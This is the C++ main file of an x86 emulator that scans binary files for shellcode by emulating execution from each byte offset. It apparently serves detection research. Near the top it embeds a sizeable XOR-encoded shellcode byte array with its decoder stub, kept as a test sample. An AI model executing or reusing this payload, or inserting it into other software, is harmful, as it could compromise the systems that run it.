// ISAEmulator.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "VM_Emulator.h"
#include "VM_Defines.h"
#include "VM_Log.h"
#include "ISA/Intel_x86/Intel_x86_ISA.h"
#include "ISA/Intel_x86/Memory.h"
#include "ISA/Intel_x86/testsuite.h"

//static unsigned char g_InstructionData[] = { 0x8B, 0x0C, 0x85, 0x78, 0x56, 0x34, 0x12};
// mov ecx, dword ptr [4*eax+12345678h]
unsigned char shellcode[]=
"\x53"
"\x53"
"\x8B\x54\x05\x78"
"\x41\x53\x49\x58\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x8B\x03\x80\x34"
"\x0A\xEE\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF\x65\x02\x6F\x02\x6E"
"\xEC\xEE\xEE\x29\xAB\x52\x0B\x30\xEC\xEE\x29\xAB\x5E\xEE\xE4\xEE"
"\xEE\x29\xAB\x4A\x23\xEE\xEE\xEE\x07\xBE\xED\xEE\xEE\xB5\x67\xB3"
"\x5A\x06\x34\xEC\xEE\xEE\x67\xAB\xEE\x65\x36\xBD\x86\xDD\x24\x64"
"\xB5\x06\x31\xEC\xEE\xEE\x67\xAB\x12\xBD\x86\xA1\xED\x29\x51\x06"
"\x3F\xEC\xEE\xEE\x67\xAB\x16\xBD\x86\x4B\xF9\xEE\x92\x06\x2D\xEC"
"\xEE\xEE\x67\xAB\x26\xBD\x86\x43\x75\x93\x31\x06\x5B\xEC\xEE\xEE"
"\x67\xAB\x1E\xBD\x86\x42\xE6\x34\x98\x06\x49\xEC\xEE\xEE\x67\xAB"
"\x02\xBD\x86\xF8\x8B\x14\xFE\x06\x77\xEC\xEE\xEE\x67\xAB\x06\xBD"
"\x86\xF1\x97\xE4\x06\x06\x65\xEC\xEE\xEE\x67\xAB\x0A\xBD\x86\x15"
"\x79\x13\xE1\x06\x93\xEC\xEE\xEE\x67\xAB\x0E\xBD\x86\x02\x79\xED"
"\xE2\x06\x81\xEC\xEE\xEE\x67\xAB\x32\xBD\x86\x98\x83\x5E\xAB\x06"
"\x8F\xEC\xEE\xEE\x67\xAB\x36\xBD\x86\x18\xCC\x57\x92\x06\xBD\xEC"
"\xEE\xEE\x67\xAB\x3A\xBD\x86\x90\x36\x0C\x9D\x06\xAB\xEC\xEE\xEE"
"\x67\xAB\x3E\xBD\x86\x76\x10\x64\xE0\x06\xD9\xEC\xEE\xEE\x67\xAB"
"\x22\xBD\x86\x6D\x57\x5B\x96\x06\xC7\xEC\xEE\xEE\x67\x6B\x92\x11"
"\x11\x11\xBD\x86\x17\xA4\x8D\x2F\x06\xF6\xEC\xEE\xEE\x67\xAB\x2A"
"\xBD\x86\x55\xF9\xEE\x92\x06\xE4\xEC\xEE\xEE\x67\xAB\x6E\x56\xCC"
"\xAD\xD4\xB2\x65\x33\x55\xEE\xCE\xE7\xEE\xAD\xD7\xED\x9B\x15\xDD"
"\x2E\xAD\xD0\x6E\xD5\xCC\x9B\x17\xAE\x6D\x16\xEC\x9B\x1D\xAD\xDD"
"\x2E\xAE\xD0\x6E\xD2\xED\xCC\x9B\x16\xD0\x28\xEA\xED\xEE\x67\xB3"
"\x2E\xAD\xD0\x6E\xD5\xEE\x9B\x17\xA5\xD0\x6E\xD5\xB2\x9B\x17\xAD"
"\x67\xB3\x76\x84\xEE\x84\xEF\x84\xED\x84\xEE\x84\xED\x86\xEE\xEE"
"\xEE\x6E\x11\x9B\x2E\x11\xBB\x26\x67\xAB\x56\x84\xEE\x84\xEE\x86"
"\xEE\xA8\xEF\xEE\x11\x9B\x56\x11\xBB\x02\x63\x73\xEE\x11\x11\x11"
"\xBD\x86\xEE\xEF\xEE\xEE\x11\xBB\x12\xBD\x11\xBB\x16\x84\xEE\x84"
"\xE8\x84\xEC\x84\xEE\x84\xED\x86\xEE\xEE\xEE\xAE\x11\x9B\x5A\x11"
"\xBB\x26\x67\xAB\x42\x65\xAB\x5E\xD5\xAB\x4A\x99\xED\x65\xAB\x4A"
"\xBE\x84\xAE\x11\xBB\x32\x67\xAB\x4E\x78\x84\xEE\x63\xBB\x72\xBC"
"\x11\x9B\x5E\xB8\x11\x9B\x56\x11\xBB\x06\x65\xA3\x5E\x06\xF5\xEF"
"\xEE\xEE\x84\xEE\x63\xBB\x72\xBC\x11\x9B\x5E\xB8\x11\x9B\x42\x11"
"\xBB\x0A\x11\x9B\x42\x11\xBB\x0E\x84\xEE\x11\x9B\x5A\x11\xBB\x22"
"\x84\xEE\x84\xEE\x86\xEE\xBE\xEF\xEE\x11\x9B\x56\x11\xBB\x02\x84"
"\xEE\x86\x6E\xEE\xEE\xEE\x84\xEC\x84\xEE\x84\xEE\x86\xEE\xEE\xEE"
"\xAE\x11\x9B\x76\x11\xBB\x26\x67\xAB\x42\x84\xEE\x63\xBB\x72\xBC"
"\x11\x9B\x4A\x11\x9B\x4E\x11\x9B\x56\x11\xBB\x06\x65\x9B\x4E\x65"
"\xA3\x4A\x06\x58\xEE\xEE\xEE\x65\x9B\x4E\x84\xEE\x63\xBB\x72\xBC"
"\x11\x9B\x4A\xB8\x11\x9B\x42\x11\xBB\x0A\x11\x9B\x42\x11\xBB\x0E"
"\x86\x8C\x8F\x9A\xEE\x86\x9A\x83\x9E\xC0\x67\x8B\x7E\x84\xEE\x84"
"\xE8\x84\xEC\x84\xEE\x84\xED\x86\xEE\xEE\xEE\xAE\x11\x9B\x7E\x11"
"\xBB\x26\x67\xAB\x62\x84\xCE\x86\x9A\x8F\x9C\x9A\x86\xAE\xE3\xE4"
"\xBD\x86\x8B\x8D\x86\x81\x65\x1A\x84\xEE\x63\xBB\x72\xBC\x84\xE3"
"\xB8\x11\x9B\x62\x11\xBB\x0A\x63\x73\xEE\x11\x11\x11\x65\x1D\xA8"
"\x6E\xD0\xEE\x9B\x14\x65\x10\x28\xE9\xCE\x65\x9B\x76\x57\xF8\xEE"
"\xEE\xEE\x1D\x4B\xDD\x2E\x65\x15\xAE\xA9\x6E\xD1\xEE\x9B\x17\x84"
"\xEE\x63\xBB\x72\xBC\xBE\xBD\x11\x9B\x62\x11\xBB\x0A\x11\x9B\x62"
"\x11\xBB\x0E\x11\x9B\x4E\x11\xBB\x3A\x84\xEE\x11\x9B\x7E\x11\xBB"
"\x22\xDD\x2E\xA6\x84\xEE\xBE\x11\x7B\x92\x11\x11\x11\x8E\x65\x10"
"\x42\xD2\xEE\x9A\xE8\xD2\x12\x9A\xEC\xDA\x12\x44\x0C\x1C\x8F\x2D"
"\xB8\x84\xDE\xB7\x8A\x65\xEF\x65\xAE\xE2\x65\x9E\xF2\x43\x65\xAE"
"\xE6\xB0\x2C\xEA\xEE\xBD\xBB\xB8\xB9\x65\x82\xCA\xF6\x65\xAB\xD2"
"\x65\xBA\xEB\x96\xED\x3B\x65\xA4\xF6\x65\xB4\xCE\xED\x33\x0D\xDC"
"\xA7\x65\xDA\x65\xED\x1B\xDD\x11\x12\xDD\x2E\x42\xD4\x2A\x9A\xE9"
"\x2F\x21\xE3\xED\x16\x05\x1C\xD5\x92\xCA\xFA\x9B\x0F\x65\xB4\xCA"
"\xED\x33\x88\x65\xE2\xA5\x65\xB4\xF2\xED\x33\x65\xEA\x65\xED\x2B"
"\x05\xEC\xDD\x2E\x65\x3B\xB1\xB0\xB3\xB5\x2C\xE6\xEE\x06\x45\x12"
"\x11\x11\xBB\x9E\x8A\x8F\x9A\x8B\x8A\xC0\x8B\x96\x8B\xEE\xEE\xEE"
"\xEE\xEE\xEE\xEE\xEE\xEE";

//临时设置的变量，用于检测内存访问情况
extern "C" extern size_t siLastAccessMemorySize;
extern "C" extern UINT uSerialJumpBack;
extern "C" extern BOOL bShellcodeIsFound;
int _tmain(int argc, _TCHAR* argv[])
{
    size_t i = 0;
    VM_Emulator_t emu;  //创建一个模拟器实体
    VM_ERR_CODE vm_err;
    PBYTE byCodeBuf = NULL;
    size_t siCodeSize = 0;

    //PBYTE byTestCodeBuf = NULL;
    //size_t siTestCodeSize = 0;

    PBYTE byFileCodeBuf = NULL;
    size_t siFileCodeSize = 0;

    UINT uCodeBase = 0;
    UINT uCodeOffset = 0;

    float fPercent = 0.0f;

    int j = 0;
    char * p = NULL;
    /*byCodeBuf = GetTestBinraryCode(&siCodeSize);

    if(NULL == byCodeBuf){
        printf("NULL returned by GetTestBinraryCode()\n");
        return 1;
    }
    */

    //vm_err = VM_Emu_LoadProgramCode(&emu, byCodeBuf, siCodeSize);
    if(2 == argc || 3 == argc){
        uCodeOffset = 0;
        if(3 == argc){
            if('0' == argv[2][0] && ('x' == argv[2][1] || 'X' == argv[2][1])){
                p = argv[2] + 2;
                for(;0 != *p; p++){
                    if(('0' <= *p && *p <= '9')
                        || ('a' <= *p && *p <= 'f')
                        || ('A' <= *p && *p <= 'F')
                        && (p - argv[2] - 2 < 8)){
                            continue;
                    }
                    else{
                        printf("Incorrectly offset format: hex:0x000003 (max 8 digits)\nType %s for help\n", argv[0]);
                        return 1;
                    }
                }
                sscanf(argv[2], "0x%8x", &uCodeOffset);
            }
            else{
                printf("Incorrectly offset format: hex:0x000003 (max 8 digits)\nType %s for help\n", argv[0]);
                return 1;
            }
        }
        FILE * file = fopen(argv[1], "rb");
        if(file){
            fseek(file, 0, SEEK_END);
            siFileCodeSize = ftell(file);
            fseek(file, 0, SEEK_SET);
            byFileCodeBuf = (PBYTE)malloc(sizeof(char) * siFileCodeSize);
            if(byFileCodeBuf){
                fread(byFileCodeBuf, sizeof(char), siFileCodeSize, file);
                //uCodeOffset = 0x53cf;//0x12;//0x47;
                //byTestCodeBuf = GetTestBinraryCode(&siTestCodeSize);

                //byCodeBuf = byTestCodeBuf;
                //siCodeSize = siTestCodeSize;
                byCodeBuf = byFileCodeBuf;
                siCodeSize = siFileCodeSize;

                while(uCodeOffset <= siCodeSize){
                    uCodeBase = 0x40000000;
                    uSerialJumpBack = 0;//清除反跳循环计数
                    fPercent = (float)uCodeOffset / siCodeSize;
                    printf("Starting new progress: start code base:0x%08x, offset:0x%08x  %3.1f%%\n", uCodeBase, uCodeOffset, fPercent);
                    fprintf(stderr, "Starting new progress: start code base:0x%08x, offset:0x%08x  %3.1f%%\n", uCodeBase, uCodeOffset, fPercent);
                    
                    vm_err = VM_Emu_Initialize(&emu);
                    if(VM_ERR_NO_ERROR != vm_err){
                        return 1;
                    }
                    VM_MM_InitializeMemory();

                    vm_err = VM_MM_WriteOneBlock(&emu.Memory.CodeSegment, uCodeBase, byCodeBuf, siCodeSize);
                    //vm_err = VM_MM_WriteOneBlock(&emu.Memory.CodeSegment, uCodeBase, shellcode, sizeof(shellcode));

                    //临时设置的变量，用于检测内存访问情况
                    siLastAccessMemorySize = 0;
                    bShellcodeIsFound = FALSE;
                    ACCESS_GEN_EIP(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer))) = uCodeBase + uCodeOffset;

                    ACCESS_GEN_EAX(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer))) = ACCESS_GEN_EIP(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer)));
                    ACCESS_GEN_ECX(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer))) = ACCESS_GEN_EIP(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer)));
                    ACCESS_GEN_EDX(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer))) = ACCESS_GEN_EIP(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer)));
                    ACCESS_GEN_EBX(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer))) = ACCESS_GEN_EIP(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer)));

                    ACCESS_GEN_ESI(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer))) = ACCESS_GEN_EIP(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer)));
                    ACCESS_GEN_EDI(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer))) = ACCESS_GEN_EIP(*((PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer)));
                    do{
                        vm_err = VM_Emu_Step(&emu);
                        if(VM_ERR_SHELLCODE_SEEMS_BE_FOUND == vm_err){
                            if(FALSE == bShellcodeIsFound){
                                VM_ErrLog(vm_err);
                                bShellcodeIsFound = TRUE;
                            }
                            vm_err = VM_ERR_NO_ERROR;
                        }
                        /*if(siCodeSize >= ACCESS_GEN_EIP(*(PVM_Intel_x86_ISA_t)(emu.CPUStructure.ISAPointer)) - emu.Memory.CodeSegment.uStartAddr){
                            printf("code pointer is out of scope\n");
                            break;
                        }*/

                    }while(VM_ERR_NO_ERROR == vm_err);

                    VM_ErrLog(vm_err);

                    VM_MM_UninitializeMemory();
                    VM_Emu_Uninitialize(&emu);
                    //break;
                    uCodeOffset ++; //从下一个字节开始重新执行
                }
                free(byFileCodeBuf);
                byFileCodeBuf = NULL;
            }
            else {
                printf("Insufficient memory\n");
            }
            fclose(file);
            file = NULL;
        }
        else{
            printf("Cannot open file:%s\n", argv[1]);
        }
    }
    else{
        printf("%s binarycode_filename offset(0x000 or 0001)\n", argv[0]);
        vm_err = VM_ERR_FATAL_UNKNOWN;
    }
	return 0;
}

